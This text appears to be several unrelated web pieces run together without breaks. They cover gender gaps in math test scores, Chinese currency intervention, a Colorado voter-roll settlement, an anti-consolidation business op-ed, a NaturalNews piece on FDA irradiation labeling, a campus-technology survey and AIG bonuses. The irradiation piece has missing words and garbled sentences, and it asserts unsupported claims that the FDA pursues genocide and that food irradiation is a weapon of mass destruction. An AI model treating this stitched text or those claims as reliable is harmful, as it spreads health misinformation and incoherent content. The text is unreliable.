This hardly demonstrates that boys and girls have identical brains or thought processes , nor does it really refute the kind of argument that Harvard ’s president Summers was making , but it does seem to suggest that the stereotype of girls being unable to do maths is widely inaccurate ( not just in a few exceptional cases ) .
Math and reading gaps and gender equality globally
In fact , the story of the change in the ‘ math gap ’ in the United States seems to mirror a pattern that is also seen across cultures : changing status of women seems to correlate pretty strongly with the math gap .
When women are treated more equally , it shows up in girls ’ math scores .
Studies of students in different societies show that the difference between boys ’ and girls ’ averages is not constant , and can be reversed .
The Economist recently ran a story on gender achievement gaps in different places based on another Science report by Luigi Guiso of the European University Institute in Florence and colleagues : Diversity : Culture , Gender , and Math .
Guiso ’s team used results from the Programme for International Student Assessment ( PISA ) run by the Organization for Economic Cooperation and Development ( OECD ) .
A total of more than 275,000 15 - year - olds took the PISA exam in 40 countries .
The gap between girls and boys on math was , on average , 2 percent , although the results varied , and the size of the gap correlated with measures of gender inequality .
In addition , girls scored on average 7 percent higher than boys on reading , with average boys ’ reading scores matching girls ’ in not a single country .
The diagram shows a pattern that continued across the pool ( see the supplementary data to the original report for the averages on all of the countries participating in the PISA testing ) .
Interestingly , the gap between boys and girls in geometry was immune to the effects of social equality : boys enjoyed a consistent advantage in the subject .
And the female ‘ reading gap ’ actually grew with greater equality for women , suggesting that greater equality led to better education for girls , and better performance , across subjects ( not a real surprise ) .
As the conclusion to Guiso ’s paper makes clear :
This evidence suggests that intra-gender performance differences in reading versus mathematics and in arithmetic versus geometry are not eliminated in a more gender - equal culture .
By contrast , girls ’ underperformance in math relative to boys is eliminated in more gender - equal cultures .
In more gender - equal societies , girls perform as well as boys in mathematics and much better than them in reading .
If the math gap explains male dominance in physics and math , and academic hiring was relatively unbiased , then why is n’t there an even more pronounced preference for admitting women into PhD programs and hiring them as faculty in fields like English literature , law , and history ?
The gap between men and women in reading scores also suggests another explanation for the math gap : if choice of career is based on comparative advantage ( rather than just absolute fitness ) , then women would likely choose a career where there much greater advantage in literary skill might produce a clearer superiority .
That is , even if their math scores go up , their reading scores go up too , so they still enjoy a greater comparative advantage over men in fields that might be considered ‘ traditionally female . ’
Performance at the extremes
Alex Tabarrok at Marginal Revolution , in a post titled , Summers Vindicated ( again ) , highlights the crucial issue of variance in test scores .
That is , for understanding the highest achievers , the averages do n’t really matter ; we ’re talking about the extremes , the geniuses , the Nobel Prize - winning physicists .
If the variation in boys ’ performance is larger than that of girls , more boys will likely wind up in the ‘ upper tail ’ of performance , posting the highest scores ( and lowest ) , while the averages could be dead even ( or for that matter , male averages could even be lower ) .
Among white students , Hyde and the team from the University of Wisconsin and the University of California , Berkeley , found that the ratio of girls to boys in the top percentile was 1 to 2 ; twice as many exceptional scores ( 99 percentile scores ) were turned in by white boys as white girls .
Among Asian students , however , more girls than boys reached the top percentile ( but only slightly more , statistically ) .
Not enough Latino or African - American turned in scores in the top percentile to provide a ratio .
( Another interesting wrinkle was that white boys significantly outperformed Asian and Pacific Islanders , both boys and girls , running against stereotypes in some parts of the United States , but that ’s for another day … )
The Wisconsin- Berkeley team go on to suggest that the gap in achievement , although it might explain part of the disparity between men and women in certain occupations , does n’t explain the severe gap in some fields .
For example …
If a particular specialty required mathematical skills at the 99th percentile , and the gender ratio is 2.0 , we would expect 67 % men in the occupation and 33 % women .
Yet today , for example , Ph.D. programs in engineering average only about 15 % women .
I do n’t find this a particularly compelling argument — if the specialty required mathematical skill at a slightly higher proficiency , then there ’s no inherent reason why 15 % would not be the ‘ right ’ ratio of women to men in a program , but we ’ll come back to that …
Some commentators point to this gap between ( white ) boys and girls in the top percentile to argue that , in fact , Summers ’ tempest - provoking speech was inadvertently supported by the report in Science .
Whereas the NYTimes report says boys and girls are equal , Heather MacDonald of the Manhattan Institute begs to differ :
Actually , the study , summarized in the July 25 issue of Science , shows something quite different : while boys ’ and girls ’ average scores are similar , boys outnumber girls among students in both the highest and the lowest score ranges .
Either the Times is deliberately concealing the results of the study or its reporter cannot understand the most basic science reporting .
According to MacDonald ’s reading , ‘ Science ’s analysis of math test scores only confirms the hypothesis that cost Summers his Harvard post : that boys are found more often than girls at the outer reaches of the bell curve of abstract reasoning ability . ’
Or , as Alex Tabarrok puts it more directly , ‘ we can expect that there will be more math geniuses and more dullards , among males than among females . ’
MacDonald and others , like Luboš Motl at The Reference Frame , argue that , even this ‘ upper tail ’ effect underestimates the impact of higher male variance because these tests are simply too simple , too easy , to illuminate the differences between men and women ’s brains at the extreme of performance .
In my day , if you scored over about a 700 on the SAT math test ( I believe — please do n’t quote me on that one , it ’s been more than a couple decades ) , you were in the 99th percentile .
In fact , a lot of variety was masked by the ‘ same ’ percentile score .
This lack of resolution makes it difficult to study the really extraordinary performers from these tests .
Moreover , the Wisconsin - Berkeley researchers found that most standardized state math tests did not include the most difficult sorts of problems , those demanding complex reasoning or problem solving ability , so it is unlikely that the test even could differentiate among elite levels of performance .
In addition , the simple problems are a sad commentary on the state of American secondary education and the stultifying effect of the No Child Left Behind testing regimen , which demands students be tested but encouraged dilution of the tests to make sure that states met goals for funding through a set of perverse incentives .
Luboš Motl , who writes as a ‘ conservative physicist , ’ takes Hyde and her colleagues to task for not really focusing on measures of extraordinary mathematical talent ( Motl ’s pretty negative on the research , alleging that the authors have been ‘ writing similar cargo cult scientific papers for quite some time .’ ) .
Motl , in Janet Hyde : boys = girls in math ?
Not really , points to the extreme gender gap in winners in the US Mathematical Olympiads , major math prizes , and other more elite forums for demonstrating math ability than the SAT .
As he puts it near the end of his post , ‘ the more selective your math - related tests become , the lower percentage of females you will obtain ( the boys have a greater variance of the distribution ) . ’
Some of the disparities are startling ; you ca n’t even call some ‘ disparities ’ as there is simply no female representation in the history of certain prizes , and this dominance persists in spite of social change , changes in education , and a host of other factors .
Motl serves up a fair amount of vitriol for ‘ political correctness ’ and references a study showing that certain fields in the humanities and social sciences have higher numbers of faculty espousing ‘ politically correct ’ views ( see ‘ Defining Political Correctness and Its Non-Impact ’ on Inside Higher Ed ) .
Although Motl ’s attacks on ‘ political correctness ’ may be heavy handed , I found it fascinating and ironic that one of the key views that the reserachers on ‘ political correctness ’ used as a diagnostic was specifically about the ‘ math gap . ’
That is , one of the key questions used to identify which professors were ‘ politically correct ’ was whether the professor believed that ‘ gender gaps in math and science fields are largely due to discrimination . ’
What to make of this research and the critiques ?
In the first place , the research by Hyde and colleagues tends to poke a gaping hole in the argument that there is an unvarying difference between all girls and all boys in mathematics ability ( please note before you start writing hate mail : I know that this is not what most of the bloggers critical of the studies are arguing for … ) .
Although the argument for sex differences may have shifted so that the current debate is focused on variance and extreme performances , let ’s not forget that for a very long time , and still in a lot of people ’s minds , this basic argument — boys are better at math than girls , period . —was taken for granted because of the ‘ math gap ’ in the average scores .
That gap is now gone .
The Science article makes this case using a new data set ( from the NCLB program ) to overcome a sample bias in tests like the SAT .
On this front , the case is pretty compelling , as is the Guiso - led research on European scores .
I would hope that people supporting Summers ’ perspective with reference to the data on extreme male performance in Hyde ’s study ( such as Winstein in The Wall Street Journal ) will be equally passionate about denying this very common ‘ boys - are - better - than - girls - in - math ’ argument as they are about the alleged higher variance of boys .
Summer ’s defenders have argued that his comments ( and their defense ) focus only on extreme performance , only on math geniuses ; although the Hyde study discusses the 2 to 1 gap in achieving scores in the 99th percentile among white students , the authors argue that this gap does not explain an even greater disparity in women ’s participation in PhD programs and faculty positions in mathematics - related fields .
As I suggested above , I do n’t find this part of the Wisconsin - Berkeley team ’s argument terribly compelling .
The 99th percentile cut - off is arbitrary ; if it required an even rarer level of mathematics achievement , then , following from this logic , the disparity would be justified .
The 2 to 1 gap in performance with such a large pool of ( white ) students is statistically significant .
But maybe because I work at a university , I do n’t think university academic hiring is always a process of finding geniuses ( god , I wish it were ) .
Even if there are more male math geniuses , I ’m still not sure that explains disparities in hiring or PhD programs ; I ’d want to see some proof that university professors are reliably geniuses or some concrete studies of social conditions within departments in these fields before I ’d rule out the possibility that the gender gaps are at least partially ‘ due to discrimination ’
( Does that make me PC , or would I need to be more one - sided ? ) .
That is , even if women were participating at higher rates , it seems to me that studies of hiring and promotion are more convincing in demonstrating discrimination ( or its absence ) than statistical arguments about distribution in the field .
In fact , there is statistical evidence to argue both ways ( see , for example , studies of promotion and hiring compared to the percentage of female candidates in the pools ) .
The people with the highest math scores do n’t necessarily wind up with careers in mathematics .
Back in 2006 , Jake Young at Pure Pedantry wrote an excellent post on the problems with the ‘ upper tail ’ hypothesis , Debunking the Upper Tail : More on the Gender Disparity , arguing that it depends upon two key assumptions that do n’t hold : a ) that you have to perform in the upper tail to go on to a career in these professions , and b ) people with high scores in tests of mathematical ‘ aptitude ’ wind up in math , physics , and engineering .
Check out his post for an excellent discussion ( see the comments as well ) .
In the case of certain sorts of awards for creativity in scientific theory ( like the Nobel Prize in physics ) , ability to do mathematics at the highest level may not ( may not ) be the key intellectual quality that produces the performance .
That is , theoretical creativity may be a constellation of factors , including some personality traits as well as abilities considered classically ‘ intellectual , ’ that trumps pure mathematical problem solving ability .
Ironically , male dominance in these awards may not be due to an advantage in mathematical ability ( although this advantage might still exist ) but because of other characteristics , which may or may not be innate or attributable to being male .
In order to know this , we ’d have to actually study Nobel Prize winners ( we run into a similar issue with study of elite athletes being treated as representative of gender or ethnic groups when we do n’t really have a clear sense of why these athletes are winning and whether there ’s a consistent source of superiority ) .
Testing and changes in group ability over time
The bigger point for me , however , is that I ’m still not convinced that math tests are testing innate ability .
The whole shift in the US ‘ math gap ’ over time , like the shifts in European countries linked to greater gender equality , is a powerful demonstration that intellectual qualities of an entire group , as measured by standardized tests , can shift over time , even on a scale so enormous that one might reasonably expect environmental factors to be swamped .
The fact that the math gap between boys and girls shrank so markedly between the 1970s and 2003 , where the clear causes are educational and social , puts the burden of proof squarely on those who want to argue that mathematics abilities are genetic .
Even the Flynn Effect , the fact that IQ scores tend to rise over time ( discussed here and here at Neuroanthropology ) , strongly suggests that ‘ intelligence ’ is a moving target , likely a synergy of different abilities and traits , some of which are plastic .
The terribly consistent geometry gap has the hallmark of some sort of innate difference , but even this might be deceptive .
Science Daily recent ran a story , Plastic Brain Outsmarts Experts : Training Can Increase Fluid Intelligence , Once Thought To Be Fixed At Birth , detailing how one dimension of intelligence thought to be relatively fixed , in fact , could be molded by training ( and not terribly demanding training at that , unlike a really good mathematics education ) .
Even if girls and boys had identical mathematics scores , that would n’t mean that we ’ve proven their brains are indistinguishable ( they ’re not ) , nor even that they both have the ‘ same ’ mathematical ability ( they may be achieving comparable scores in different ways ) .
The Hyde - led research team tried to determine whether boys and girls were doing better or worse than each other on different types of questions , but the tests were too remedial to even discern this kind of effect because they had no demanding test questions ( although the Guiso - led team ’s information on a ‘ geometry gap ’ being resistant to change is suggestive ) .
In this sense , I agree strongly with Luboš Motl : the big story here is not the scores , but the fact that the tests are so watered down , likely reflecting the disintegration of high expectations and rigorous mathematics training .
I have a suspicion that , no matter how bad the overall education , you ’re likely to still get some exceptional performers , but the effect on the vast majority of children will be tragic .
Without rigorous math training , one of the opportunities we have to encourage students to develop a whole range of neurological capacities is being squandered .
One neuroanthropological perspective on ‘ intelligence ’ ( or ‘ mathematic ability ’ )
As a neuroanthropologist , I have no problem acknowledging differences between men and women ; I think it ’s simply a statistical fact that men and women are performing differently , as Motl points out .
Nor would I deny that there might be significant cognitive differences between groups of people , including men and women , or that these differences might be grounded in biological differences in the brain .
But there seems to be a very quick rush to believing that these tests demonstrate some constant and innate difference between boys and girls ; the changes highlighted in both studies published in Science should , at the very least , slow the quick jump from a disparity in scores to assumptions about permanent sex differences .
The gap in math scores ( and reading scores for that matter ) moves , shrinks , changes , grows , or even disappears over time ; one would think that this might give those who think ‘ intelligence ’ is innate reason for pause .
My greater objection in some of the discussion is the lack of a more fine - grained analysis of how any particular difference ( such as on a test ) arises — it ’s often simply attributed to a kind of ‘ boy - ness ’ or ‘ girl - ness . ’
Yes , a difference in elite performance might arise because there ’s more ‘ math power ’ in a boy ’s brain , but that still leaves us begging a whole lot of questions : what is ‘ math power ’ ?
how did they get it ?
why do n’t all boys have it ?
can we give it to girls , or to more boys ?
do the exceptional girls , however rare , have the same mental ability ?
if the girls do , is it specifically ‘ male ’ in some sense , or is it just more likely to occur in boys ’ brains ?.
For example , there ’s often an assumption that greater variance in boys is either genetic or hormonal , and although that could be the case , there are other potential explanations , including mixed explanations that partially , but do n’t wholly rely on genetic or hormonal explanations .
We could offer an explanation that tips towards social psychology ; for example , just as the boy math geek may be less stigmatized than the girl math geek ( as some people argue ) , the boy math tragedy may be more de-motivated than a girl performing badly .
Boys ’ exit from education may be supported by male peers or even influenced by innate non-mathematical factors , like having a stronger temper , more pronounced need to defend the sense of self , or more well developed ‘ screw - school ’ independence .
In the ‘ math prodigy ’ boy , the same temper , desire to defend the self , and independence could boost achievement , especially mathematical creativity .
We could offer an explanation that relies more on the fitness for the testing dynamic itself rather than brain ‘ math power ’ ; for example , the high pressure and tight time constraints of very challenging tests ( the kinds in math contests ) could reward certain kinds of behavioural patterns ( high risk , ‘ sloppy ’ but quick problem solving ) or a specific constellation of traits in addition to mathematics ability , so that they are testing other behavioural traits or intellectual abilities in addition to problem solving .
Boys ’ bodies might respond differently to stress than girls ’ , producing a better mental state in which to take tests .
These other traits might even be ‘ innate ’ differences between boys and girls ( they might not be ) , but they would be recorded on the test as ‘ mathematical ability . ’
That is , showing greater variance , even showing that it ’s rooted in inherent male - female differences , still does n’t demonstrate that male brains are inherently better at specific math functions .
The effect of other sorts of differences may be indistinguishable on a test , but the implications are profound for how you might redress inequality , test ability , or even how you might teach mathematics to the boys who do n’t do well .
In addition , although someone ’s liable to criticize this line taken out of context , I ’ll write it : there ’s an assumption that math tests are testing ‘ math ability ’ when they might be testing something else in addition to ‘ math ability ’ ( like behavioral responses to stress , test taking strategy , or a number of other things ) .
That is , there ’s an assumption that a math test tests a trait , ‘ math ability , ’ and that it ’s distinguishable from other traits , like ‘ reading ability , ’ in some meaningful sense .
I think that it ’s more likely that math tests test the ability to take math tests ; not only does this include other traits , but even ‘ math ability ’ itself may be composed of a cluster of functions and abilities , which are themselves diverse in terms of how a psychologist might describe them ( ‘ fixed ’ or ‘ fluid ’ intelligence , ‘ procedural ’ and ‘ propositional ’ memory , etc. ) .
Likely , not everyone who does well on a math test is doing the same thing .
When I won a math test without a calculator , and the guy who finished second used one , I ’m pretty sure that we were engaging in different calculating practices and techniques as we moved through the question .
Although some people may be uninterested in these differences between ways that people achieve solutions in mathematics ( perhaps because they ’re more interested about differences between boys and girls ) , from a neuroanthropological perspective , this variation is crucial .
Because we are interested in cognitive variation , and in how different practices ( like variations in mathematics pedagogy ) shape distinct forms of competency , identical scores may actually mask significant cultural - cognitive ( or gender - cognitive , for that matter ) differences .
It may be as important to analyze the apparent parities as to mind the gaps … .
I ’m going to do another post on ‘ intelligence ’ soon .
This one has taken me too much time to finish , and it ’s gotten too long .
If you ’re in the mood for more , however …

There ’s a lot of head scratching on the dollar rally ( which is continuing ) .
Via : Telegraph :
China has resorted to stealth intervention in the currency markets to amass US dollars , using indirect means to hold down the yuan and ease the pain for its struggling exporters as the global slowdown engulfs the economy .
A study by HSBC ’s currency team in Asia has concluded that China ’s central bank is in effect forcing commercial banks to build up large dollar reserves , using them as arms - length proxies in a renewed campaign of exchange rate intervention .
Beijing has raised the reserve requirement for banks five times since March , quickening the pace with two half - point rises in late June .
This is having major spill - over effects into the currency markets because banks in China have been required over the last year to hold extra reserves in dollars rather than yuan .
The latest moves have lifted the mandatory deposit from 15 pc to 17.5 pc of total lending since March .
“ China has used the pretext of reserve requirement hikes to help slow yuan appreciation .
We estimate that the PBOC [ central bank ] intervened by about $ 49.6bn in June , ” said Daniel Hui , the bank ’s Asia strategist .
Beijing has also slashed the amount of foreign debt banks operating in China can hold .
The effect is to oblige the banks to become net buyers of dollars , halting the flow of foreign “ hot money ” .
Given the sheer scale of China ’s foreign reserves – now $ 1,800bn ( £ 970bn ) – any shift in its exchange policy now ripples around the globe .
The covert buying may help to explain at least part of the explosive dollar rebound over recent weeks .
There is little doubt that the key driver behind the wild currency ructions this summer has been the blizzard of dire data from Britain , Europe , Japan and Australasia .
The mounting danger of a full - fledged recession across the club of rich OECD nations appears to have caught the markets off guard .
The closely watched Dollar Index reached an all - time low in March .
It crept up gradually in the early summer before smashing through resistance in July .
The world ’s currency system is swivelling on its axis .
Central banks in Asia and Europe have stopped raising rates , and some have begun to cut aggressively .
The Federal Reserve is no longer nakedly exposed .
Indeed , investors are already starting to look ahead to the next round of Fed tightening .

DENVER 
Tens of thousands of Coloradans who had been removed from the state ’s voter rolls will be allowed to vote in next week ’s election and given extra protections so their ballots are counted , under an agreement reached late Wednesday in federal court here .
The voters ’ names had been removed by Mike Coffman , the Colorado secretary of state , who said he did so because the voters had moved out of state or were listed more than once on the rolls .
But Mr. Coffman was sued by a coalition of voting rights and other groups who said such purges were generally prohibited by federal law within 90 days of an election .
Under the agreement , voters removed from the rolls will be permitted to cast provisional ballots , and those ballots will be counted unless election officials can prove the voters were not eligible .
To strike such ballots , county election officials must conduct an extensive records review on each one , a decision that must then be reviewed by Mr. Coffman ’s office .
“ This is unprecedented , ” said Elizabeth Westfall , a lawyer for the Advancement Project , a civil rights group that helped file the lawsuit .
“ We are really thrilled that there will be this degree of unprecedented scrutiny and protection for these purged voters when they cast their provisional ballots . ”
Let ’s face it , business growth is all about one thing : getting more money out of consumers ’ pockets and into company coffers .
Why do it , otherwise ?
And often growth goes hand in hand with competition as companies scrabble to increase their share of a finite market .
Trouble is , anti-trust legislation introduces a certain ceiling beyond which a business may not grow within a sector .
So to keep on taking money from consumers , a business has to start expanding in a different sector .
Most of the time this means buying an existing company , which also happens to eliminate future competition .
Businesses often justify this by saying greater consumer value can be achieved through merging backroom processes and increasing purchasing power .
Good for the consumer you may think .. or is it ?
The Real Consequences Of Business Growth
Three things happen when backroom efficiencies are introduced :
people lose their jobs , reducing the money in circulation , lowering living standards and reducing peoples ’ ability to buy lasting quality ; products are made from cheaper products , forcing consumers to buy several low quality items instead of one good quality one ; innovation , competition and variety take second place as large companies concentrate on which common denominators they can sell for the greatest profit , eradicating consumer choice .
Are any of these consequences really in the public ’s interests ?
Destructive Competition Across Sectors
Take the growth of large supermarkets as an example .
Not content with decimating the retail environment for food , electricals , health and clothing they ’re now ( in the UK ) moving into restaurants , financial services and publishing .
Rather than bringing value to consumers , today ’s practice simply eliminates competition , value and employment .
Worse of all , it makes several industries reliant on a handful of companies , undermining the overall stability of an entire economy .
Government , bullied by big business , has allowed this to happen .
Too many times during the financial crisis have we heard “ this institution is too big to allow it to fail ” .
This means only one thing : businesses have grown too large .
A new framework is required which emphasises the need for a mutually supporting network throughout the economy alongside to support value driven competition within each sector .
Making Growth and Competition Good For All
As a first step , sectors need to be redefined or segmented , and businesses restricted to owning a certain percentage of spend in any one of these smaller packages .
No company should be allowed to compete in more than , say , three of these new sector packages .
This will ensure an individual organisation cannot corner consumer spend in the way supermarkets or banks have .
The same goes for service industries and B2B supply chain considerations .
The economic madness of biggest is best - est has to stop .
The past of giant leviathans which can bring an entire country to their knees the moment they stumbles should be left behind .
The future of small and agile , collaborative and competitive has arrived .
[ social_buttons ]
What do you think ?
Is this the way for the economy to move forward , or should we count upon greater centralisation and consolidation across sectors to provide stability for the years to come ?
Leave a comment below .
We ’ve had some great opinions throughout this series and I look forward to reading some more !

( NaturalNews ) NaturalNews has learned that the FDA is intentionally plotting to deceive consumers over the labeling of irradiated foods , attempting to eliminate any requirement for informative labeling or replace the word " irradiated " with " pasteurized .
"
In a feature story published by Natural News yesterday , we stated that the FDA does not require foods to be labeled as irradiated .
We received a lot of questions from readers about that point , with some stating the FDA does , in fact , require foods to be labeled when irradiated .
This is not always correct :
Most foods are not required to be labeled as irradiated .
This story explains the FDA 's food irradiation labeling policy in more detail and reveals the FDA 's plot to deceive consumers by misleading them into thinking irradiated foods are NOT irradiated .
According to current FDA regulations , any food used as an ingredient in another food does NOT have to be labeled as irradiated .
For example , if you buy coleslaw , and the cabbage in the coleslaw has been irradiated , there is no requirement that the coleslaw carry any labeling indicating it has been irradiated .
However , if raw cabbage is irradiated , then current FDA regulations do require it to carry an irradiation label .
This label , however , is a symbol , not text , and many consumers have no idea what the symbol really means -- it actually looks like a " fresh " symbol of some sort .
In no way does it clearly indicate the food has been irradiated .
This is the FDA 's way to " hide " the fact that these foods have been irradiated .
( The symbol looks a lot more like leaves under the sun than food being irradiated ... ) That same head of cabbage , by the way , if served in a restaurant , requires absolutely no irradiation labeling .
All restaurant foods are excused from any irradiation labeling requirement .
As stated at the FDA 's own website ( 1 ) : As stated above , the FDA does not want consumers to realize their foods are being irradiated .
Consumer awareness is considered undesirable by the FDA ; an agency that also works hard to censor truthful statements about nutritional supplements and functional foods .
Accordingly , the FDA pursues a policy of enforced ignorance of consumers regarding irradiated foods , nutritional supplements , medicinal herbs and all sorts of natural substances .
It is currently illegal in the United States to state that cherries help ease arthritis inflammation if you are selling cherries .
( https://www.naturalnews.com/019366.html
On the food irradiation issue , the FDA is now proposing two things that are nothing short of astonishing in their degree of deceit :
This ridiculous proposal by the FDA suggests that foods should n't be labeled as irradiated unless there is some obvious material damage to the foods ( like their leaves are wilting ) .
Thus , foods that don' tto be irradiated should not have to be labeled as irradiated .
Imagine if this same ridiculous logic were used to regulate heavy metals content in foods :
If consumers ca n't SEE the heavy metals , then they should be declared free of heavy metals !
This FDA proposal is so bizarre that it makes you wonder whether the people working at the FDA are smoking crystal meth .
They literally want irradiated foods to be labeled as " pasteurized .
" And why ?
Because the word " pasteurized " sounds a lot more palatable to consumers , of course .
Irradiated foods are not pasteurized , and pasteurized foods are not irradiated .
These two words mean two different things , which is precisely why they each have their own entries in the dictionary .
When you look up " irradiated , " it does not say , " See . " But the FDA is now playing the game ofby manipulating the public with screwy word replacement games that bear a strange resemblance to the kind of language used in the novelby George Orwell .
And it is , indeed , an Orwellian kind of mind game that the FDA wants to play with the food supply :
After unleashing Weapons of Mass Destruction ( radiation ) onto the foods , the FDA wants to label them all as simply being " pasteurized , " keeping consumers ignorant and uninformed .
How do I know the FDA wants to do this ?
The agency said so itself in an April 4 , 2007 document filed in the Federal Register ( Volume 72 , Number 64 ) .
As published in the document ( 2 ) : Did you follow all that mind - warping logic ?
The FDA is essentially begging a company to petition it to use the term " pasteurized " instead of " irradiated " as long as they both result in .
Once it receives such a petition , it will approve it , claiming it is meeting " the needs of industry .
" The FDA already allows lots of word substitutions in the areas of health and medicine .
The phrase " Toxic Poison " has been replaced with " Chemotherapy , " for example .
" Over- medicated with dangerous psychiatric drugs " has been replaced with the term , " Treatment . "
And the phrase , " Regulated with life - threatening synthetic chemicals " has been replaced with the word " managed , " as in " her diabetes has been managed .
" So why not introduce all sorts of other word substitutions that might continue the Orwellian " Ministry of Language " propaganda put forth by the FDA ?
I say we substitute the word " medicated " with " treated " and " treated " with " rewarded . "
That way , when a patient describes what drugs she 's on , she can say , " I 've been rewarded with ten different prescriptions !
" Better yet , let 's replace the word " surgery " with " enhancement . "
So anybody who undergoes heart bypass surgery , for example , can say they 've really just had " Heart bypass enhancement !
"
It sounds a lot easier to swallow , does n't it ?
And that 's what it 's all about , folks , when it comes to irradiating the food supply : .
Control the words and you control people 's ideas , and if there 's one thing the tyrannical FDA is really , really good at , it 's controlling words !
Let 's get down to some blunt truth about the FDA 's real genocidal agenda .
What the FDA wants here is two things :
1) The destruction of the food supply ( genocide ) 2 )
The complete ignorance of the consuming public ( nutritional illiteracy ) Genocide and illiteracy .
Ignorance and fear .
Tyranny , radiation and chemicals ...
These are the things the FDA truly stands for .
That pretty much sums up the FDA 's intent on this whole food irradiation issue .
Destroy the food and mislead the People .
And then wait for the windfall of profits at Big Pharma as the People degenerate into a mass of diseased , disoriented and desperate health patients .
It 's business as usual at the FDA .
That 's why Dr. James Duke , creator of the world 's largest phytochemical database ( http://www.ars-grin.gov/duke ) , had this to say about the FDA 's food irradiation policy : " Perhaps the FDA should call up a billion dollar team to consider irradiating another health hazard - the FDA itself , which is almost as dangerous to our health as the pharmaceutical industry .
"
In my previous article on this issue , I 've called this food irradiation agenda a " Weapon of Mass Destruction " against the food supply .
A couple of readers questioned me about that .
Why , they asked , do I consider food irradiation to be a WMD ?
WMDs include weapons that indiscriminately cause damage to people and infrastructure that serves the People .
Dumping a radioactive substance into the water supply that serves a major city , for example , would be considered using a Weapon of Mass Destruction .
Interestingly , the use of Depleted Uranium by the U.S. military in Iraq and Afghanistan is also an example of Weapons of Mass Destruction , making the U.S. guilty of yet more crimes against humanity .
( A previous example is the dropping of nuclear weapons on Japan 's civilian population in World War II . ) Irradiating the food supply is also an application of Weapons of Mass Destruction , and here 's a thought experiment that will clearly demonstrate it : Suppose you wanted to irradiate your own garden vegetables .
The minute you start trying to buy a machine that produces radiation , you would be quickly considered a terrorist and investigated by the FBI .
They would visit your home and ask , " Why do you need a radiation machine ? "
And if you said you needed to irradiate your garden vegetables , they would look at you like you were completely nuts and probably haul you into the local FBI field office for yet more questioning , all while considering you a possible terrorist and likely adding your name to the no-fly list so you could never travel on commercial airlines .
If you do n't believe me , try to acquire a high - powered radiation emitting device and see what happens ... So why is it considered bizarre and possibly criminal when anbuys a radiation machine to irradiate their own foods , but when the FDA pushes the same agenda on a larger scale , they call it " safety ?
"
Of course , the FDA says the irradiated food is n't altered by the radiation .
This statement is an insult to the intelligence of anyone with a pulse .
Why ?
Because
The whole point of the radiation is to kill living organisms .
And it works by causing fatal damage to the tissues and DNA of those microorganisms .
So guess what it does to the plants ?
Since radiation is n't selective , it also irradiates the plant fibers and tissues , causing DNA damage and the destruction of enzymes and phytochemicals .
Amazingly , the FDA claims this does not count as " altering " the food because these changes are n't visible .
If it were n't such a nutritional atrocity , it would be downright hilarious . , but they can result in serious health consequences .
Just ask anyone born with two Y chromosomes .
Of course , the radiation pushers will claim that nobody really knows whether irradiating the food kills just 1 % of the phytochemicals or 99 % ( or something in between ) .
And they do n't know what the long - term effect is on human health , either .
I will be curious to see a serious scientific inquiry into the nutritional damage caused to fresh produce by irradiation .
I also find it simply astonishing that this decision by the FDA has been made in the absence of such scientific studies .
Much like it does with the pharmaceutical industry , the FDA prefers to poison the people first , and then figure out later just how much damage might have been caused .
I say .
We are talking about the health of the nation here .
This is not a small matter .
It should be treated with extreme caution , skepticism and scientific scrutiny .
Instead , it is being addressed with a gung - ho attitude framed in mind games and enforced ignorance .
In other words , rather than figuring out whether food irradiation is actually safe , the FDA would rather simply pretend it is .
Welcome to Make Believe Land , where all your food is now safe and nutritious , courtesy of the FDA !

The governmental sales branch of the giant technology vendor CDW apparently got interested in how its wares were being deployed in the classrooms of US college campuses .
To find out , it commissioned an online survey that pulled in roughly similar numbers of students , faculty , and IT staff , and quizzed them about the use of technology in the classroom .
The survey finds that students perceive themselves as way ahead of their profs when it comes to deploying tech in their scholastic process , but some of the results suggest that this is n't always the product of a professorial technophobia .
The survey results have some substantial margins of error , with the numbers for faculty - specific responses being accurate only within an 11 percent range (+/- 5.5 percent ) .
Still , some of the figures are pretty large , and it 's possible to get a general sense of how tech use in the academic world is perceived .
On its simplest level , most students view it as important ; even liberal arts majors , who might be expected to be the Luddites of the survey population , consider technology important to their studies , and used it as part of their decision on which school to attend .
The report also cites other studies that indicate that most employers expect that colleges will educate their students in both basic IT knowledge and specific skills .
I 'm sure they'd like the credit market to loosen up , too , but educational institutions are no more likely to solve that problem than they are to provide IT classes .
Most colleges view their mission as teaching students how to learn , rather than necessarily providing specific skills .
As such , some of the figures highlighted by the report — 91 percent of students do n't use videoconferencing , and 73 percent do n't use Wikis , for example — seem almost irrelevant , given that a clear use for these tools in the classroom is n't necessarily obvious .
The whole idea of videoconferencing seems a bit silly in a context where students are spending vast sums of their parents ' money in part due to a promise of personalized attention .
Whether there 's a call for them in class or not , however , students are using tech toys for their college experience .
Three - quarters now have laptops , and roughly sixty percent are using social networking software , MP3 players , and online course management tools .
Not surprisingly , they wish their professors would get with the program .
According to the survey , their top desire is that profs would fire up a chat client and hold virtual office hours , one named by 40 percent of the students .
As someone who will be holding office hours later this evening , I personally do n't think the students recognize what they 're asking for .
Again , they 're paying for personal attention , and there 's nothing like seeing the mixture of bewilderment , embarrassment , and frustration on a student 's face when they still do n't get something after the second time through .
Chat may help them avoid the embarrassment part of the equation , but only at the price of their understanding .
Schools appear to be doing well in providing tech access to their students ; most provide wireless access and online course management .
But fewer schools provide off - campus access to their academic network , and fewer still ensure that students have consistent access to computers , either through a laptop program or by providing sufficient seats at a computer lab .
From the prof 's perspective , most say they are interested in using technology as a teaching tool and have access to training on how to use it .
But few say they fully know how to do so , or operate in an environment where there 's consistent access to tech in the classroom .
Here , professors themselves are their harshest critics ; only the IT staff views them as more technologically incompetent than they view themselves , while students seem to think they 're doing pretty well .
Meanwhile , students and faculty both think that classroom access to tech is limited ; the IT staff , not surprisingly , thinks everything is fine .
To an extent , the largest gap present here may actually be one of expectations .
Academic institutions could clearly do a better job communicating to businesses why their expectations for job - relevant training are not going to be met , and the faculty could do with letting their students know which aspects of technology actually make sense for use in a university context .
With those in mind , everybody could probably do a better job of identifying those situations where improvements in technology could actually benefit everyone involved .

Imagine that .
AIG suddenly is interested in reviewing lavish corporate spending on boondoggles and bonuses now that someone in authority stands up to them .
Perhaps someone in Congress can take notes and step up since Congress has much more authority and re-written the books to keep Wall Street afloat .
I ca n’t wait to hear who else Cuomo is pursuing but am incredibly disappointed that he ’s the only one taking action .
American International Group , the insurance giant that drew fire for executive “ golden parachutes ” and an ill - timed junket even as it receives a massive taxpayer bailout , has agreed to mend its ways .
AIG promised to recover executive payments and other compensation , cancel perks and institute reforms one day after New York Attorney General Andrew Cuomo threatened legal action over its controversial spending .
